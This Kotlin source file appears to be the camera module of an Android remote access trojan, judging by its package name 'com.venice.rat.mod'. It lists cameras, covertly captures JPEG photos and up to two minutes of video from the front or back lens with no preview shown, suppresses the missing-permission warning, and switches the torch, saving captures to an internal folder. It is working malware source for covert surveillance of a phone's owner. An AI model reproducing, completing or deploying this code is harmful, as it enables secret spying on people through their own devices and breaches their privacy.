package com.venice.rat.mod

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Size
import android.view.Surface
import com.venice.rat.core.U
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

@SuppressLint("MissingPermission")
object Cam {

    fun list(ctx: Context): String {
        val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val sb = StringBuilder()
        m.cameraIdList.forEach { id ->
            val c = m.getCameraCharacteristics(id)
            val f = c.get(CameraCharacteristics.LENS_FACING)
            sb.appendLine("id=$id facing=${if (f == 1) "FRONT" else "BACK"}")
        }
        return sb.toString().ifBlank { "no camera" }
    }

    private fun pick(ctx: Context, facing: Int): String? = runCatching {
        val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        m.cameraIdList.firstOrNull {
            m.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: m.cameraIdList.firstOrNull()
    }.getOrNull()

    private fun orient(ctx: Context, facing: Int): Int {
        val r = runCatching {
            (ctx.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager)
                .defaultDisplay.rotation
        }.getOrDefault(Surface.ROTATION_0)
        val deg = when (r) {
            Surface.ROTATION_90 -> 90
            Surface.ROTATION_180 -> 180
            Surface.ROTATION_270 -> 270
            else -> 0
        }
        return if (facing == CameraCharacteristics.LENS_FACING_FRONT) (360 - deg) % 360 else deg
    }

    private suspend fun open(m: CameraManager, id: String, h: Handler): CameraDevice =
        suspendCancellableCoroutine { c ->
            m.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) { if (c.isActive) c.resume(d) }
                override fun onDisconnected(d: CameraDevice) = d.close()
                override fun onError(d: CameraDevice, e: Int) {
                    d.close()
                    if (c.isActive) c.resumeWithException(RuntimeException("cam err $e"))
                }
            }, h)
        }

    private suspend fun session(d: CameraDevice, surf: List<Surface>, h: Handler): CameraCaptureSession =
        suspendCancellableCoroutine { c ->
            d.createCaptureSession(surf, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(s: CameraCaptureSession) { if (c.isActive) c.resume(s) }
                override fun onConfigureFailed(s: CameraCaptureSession) {
                    if (c.isActive) c.resumeWithException(RuntimeException("cfg fail"))
                }
            }, h)
        }

    suspend fun photo(ctx: Context, facing: Int, flash: Boolean): File? {
        val id = pick(ctx, facing) ?: return null
        val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val ch = m.getCameraCharacteristics(id)
        val f = ch.get(CameraCharacteristics.LENS_FACING) ?: facing
        val map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
        val sizes = map.getOutputSizes(ImageFormat.JPEG) ?: return null
        val sz = sizes.filter { it.width <= 1920 }.maxByOrNull { it.width * it.height } ?: sizes[0]
        val ht = HandlerThread("cam$facing").apply { start() }
        val h = Handler(ht.looper)
        val out = U.dir(ctx, "cam")
        val def = CompletableDeferred<File?>()
        var dev: CameraDevice? = null
        var sess: CameraCaptureSession? = null
        var rd: ImageReader? = null
        try {
            withTimeoutOrNull(25000) {
                rd = ImageReader.newInstance(sz.width, sz.height, ImageFormat.JPEG, 2)
                rd!!.setOnImageAvailableListener({ r ->
                    val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    try {
                        val b = img.planes[0].buffer
                        val arr = ByteArray(b.remaining()); b.get(arr)
                        val file = File(out, "c_${System.currentTimeMillis()}.jpg")
                        file.writeBytes(arr)
                        def.complete(file)
                    } catch (e: Exception) { def.complete(null) } finally { img.close() }
                }, h)
                dev = open(m, id, h)
                sess = session(dev!!, listOf(rd!!.surface), h)
                val req = dev!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                    addTarget(rd!!.surface)
                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                    if (flash) set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_SINGLE)
                    set(CaptureRequest.JPEG_ORIENTATION, orient(ctx, f))
                }
                sess!!.capture(req.build(), null, h)
                def.await()
            }
        } catch (e: Exception) {
            def.complete(null)
        } finally {
            runCatching { sess?.close() }
            runCatching { dev?.close() }
            runCatching { rd?.close() }
            ht.quitSafely()
        }
        return def.await()
    }

    suspend fun video(ctx: Context, facing: Int, secs: Int): File? {
        val id = pick(ctx, facing) ?: return null
        val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val ch = m.getCameraCharacteristics(id)
        val f = ch.get(CameraCharacteristics.LENS_FACING) ?: facing
        val map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
        val sz = map.getOutputSizes(MediaRecorder::class.java)
            ?.filter { it.width <= 1280 }?.maxByOrNull { it.width * it.height } ?: Size(640, 480)
        val ht = HandlerThread("cv").apply { start() }
        val h = Handler(ht.looper)
        val out = File(U.dir(ctx, "vid"), "v_${System.currentTimeMillis()}.mp4")
        var dev: CameraDevice? = null
        var sess: CameraCaptureSession? = null
        var rec: MediaRecorder? = null
        return try {
            dev = open(m, id, h)
            rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            rec.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(sz.width, sz.height)
                setVideoFrameRate(24)
                setVideoEncodingBitRate(2_000_000)
                setOrientationHint(orient(ctx, f))
                setOutputFile(out.absolutePath)
                prepare()
            }
            sess = session(dev, listOf(rec.surface), h)
            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                addTarget(rec.surface)
            }
            sess.setRepeatingRequest(req.build(), null, h)
            rec.start()
            kotlinx.coroutines.delay(secs.coerceIn(2, 120) * 1000L)
            runCatching { rec.stop() }
            if (out.exists() && out.length() > 1000) out else null
        } catch (e: Exception) {
            null
        } finally {
            runCatching { rec?.release() }
            runCatching { sess?.close() }
            runCatching { dev?.close() }
            ht.quitSafely()
        }
    }

    fun torch(ctx: Context, on: Boolean): Boolean = runCatching {
        val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val id = m.cameraIdList.first { m.getCameraCharacteristics(it)
            .get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true }
        m.setTorchMode(id, on)
        true
    }.getOrDefault(false)
}
